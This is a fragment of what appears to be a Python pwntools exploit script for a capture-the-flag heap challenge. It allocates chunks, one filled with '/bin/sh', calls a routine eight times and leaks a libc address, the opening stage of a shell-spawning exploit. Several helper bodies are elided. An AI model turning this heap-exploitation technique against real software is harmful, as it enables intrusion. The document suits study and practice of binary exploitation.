...
def add(size:int, name:bytes=b'\x00', call_num:bytes=b'\x00'):
    global io
...
def call(idx:int):
    ...
    io.sendlineafter("Please input the index:\n", str(idx))
    io.recvuntil("You try it!\n")
    io.recvuntil("Done\n")

io.recvuntil("maybe you know the new libc\n")
add(0x80)
add(0x20)
add(0x18, b'/bin/sh\x00' * 2) # 2

for _ in range(8):
    call(0)

msg ,_ = show(0)
leak_addr = u64(msg[:6] + b'\x00\x00')
